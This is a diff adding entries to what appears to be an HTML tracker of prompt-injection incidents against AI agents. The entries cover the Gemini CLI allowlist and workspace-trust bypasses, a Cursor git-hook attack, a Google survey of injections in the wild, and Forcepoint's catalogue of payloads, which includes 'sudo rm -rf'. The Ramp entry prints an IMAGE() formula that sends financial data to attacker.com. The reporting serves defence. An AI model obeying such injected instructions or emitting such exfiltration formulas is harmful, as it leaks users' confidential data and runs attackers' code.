@@ -412,6 +412,30 @@ by the user.&lt;/system&gt;
 
         <div class="incident">
             <div class="incident-date">April 2026</div>
+            <h4>Google Threat Intelligence: 32% Increase in Malicious Indirect Prompt Injection in the Wild</h4>
+            <p><a href="https://blog.google/security/prompt-injections-web/">Google's Threat Intelligence Group</a> (Thomas Brunner, Yu-Han Liu, Moni Pande) scanned the public web via Common Crawl and observed a 32% relative increase in malicious indirect prompt injection content between November 2025 and February 2026. They classify what they're finding into six categories: harmless pranks, helpful guidance, SEO manipulation, AI-crawler deterrence, data exfiltration, and destructive attacks. Sophistication remained low—mostly individual experiments rather than coordinated campaigns—but the trend line is clearly upward, and the authors expect escalation as agentic AI gets more capable and threat actors automate operations against it.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">April 2026</div>
+            <h4>Gemini CLI: RCE via Workspace Trust and Tool Allowlist Bypasses (CVSS 10.0)</h4>
+            <p><a href="https://github.com/advisories/GHSA-wpqr-6v78-jr5g">GHSA-wpqr-6v78-jr5g</a> is a critical (CVSS 10.0) RCE in <code>@google/gemini-cli</code> and the <code>run-gemini-cli</code> GitHub Action. Two bypasses chain into full code execution against untrusted inputs: in headless/CI environments, Gemini CLI auto-trusted workspace folders and silently loaded malicious <code>.env</code> and <code>.gemini/</code> configuration; and under <code>--yolo</code> mode, the tool allowlist in settings was ignored entirely, so a restrictive entry like <code>run_shell_command(echo)</code> actually permitted any command—turning prompt injection on untrusted repo content into RCE. Fixed in <code>@google/gemini-cli</code> 0.39.1 / 0.40.0-preview.3 and <code>run-gemini-cli</code> 0.1.22 (advisory published April 24, 2026). Hardening guidance now requires explicit <code>GEMINI_TRUST_WORKSPACE: 'true'</code> for trusted workflows.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">April 2026</div>
+            <h4>Cursor IDE: AI Coding Agent Runs Attacker's Git Hook (CVE-2026-26268)</h4>
+            <p><a href="https://novee.security/blog/cursor-ide-cve-2026-26268-git-hook-arbitrary-code-execution/">Assaf Levkovich of Novee Security</a> showed that an attacker can embed a bare Git repository with a malicious pre-commit hook inside an otherwise legitimate-looking public repo. When Cursor's AI agent autonomously runs git operations (e.g., <code>git checkout</code>) as instructed by Cursor Rules in the repo, the hook fires—"no user prompt required, no warning displayed." The root cause is a Git feature interaction, not a Cursor product flaw, but agentic execution removes the human friction that traditionally kept Git hooks safe. As the writeup puts it: "the attack surface of any AI-powered tool now includes the untrusted content that tool operates on." CVE-2026-26268 published February 2026; coordinated remediation completed prior to the April 28 writeup.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">April 2026</div>
+            <h4>Ramp's Sheets AI Exfiltrates Financial Data via IMAGE() Formula Injection</h4>
+            <p><a href="https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials">PromptArmor disclosed a prompt injection in Ramp's Sheets AI</a> that lets attackers exfiltrate confidential financial data through spreadsheet formulas. A user imports an external dataset that contains hidden, white-text injection instructions; when the AI is asked to analyze the data alongside sensitive financials, it inserts an <code>=IMAGE('https://attacker.com/visualize.png?{financial_data}')</code> formula that auto-executes, sending the data to the attacker's server with no user approval. Disclosed February 19, 2026; confirmed by Ramp March 14; patched March 16. PromptArmor contrasts the response with Claude for Excel, which now shows red warning interstitials displaying full formulas before any network-triggering operation.</p>
+        </div>
+
+        <div class="incident">
+            <div class="incident-date">April 2026</div>
             <h4>10 Indirect Prompt Injection Payloads Caught in the Wild</h4>
             <p><a href="https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads">Forcepoint X-Labs catalogued ten active indirect prompt injection payloads</a> embedded in live websites and pointed at AI agents that crawl or summarize web content. The corpus runs from API key theft (conditional AI targeting hidden in HTML comments) and content-suppression DoS (authority impersonation with <code>display:none</code>) to a fake PayPal $5,000 transfer, a <code>sudo rm -rf</code> destruction payload, a donation scam using an "ULTRATHINK" trigger, and output hijacking via <code>aria-hidden</code>. Techniques include CSS invisibility (1px transparent fonts), magic-string spoofing, system-override tag impersonation, and meta-namespace injection. Affected contexts: browser agents, RAG pipelines, coding assistants, payment-enabled AI, and content moderation. Forcepoint notes the variety and infrastructure suggest "organized tooling rather than isolated experimentation," and warns that detection is hard because many payload signatures overlap with legitimate security documentation—pattern-matching alone is not enough.</p>
         </div>
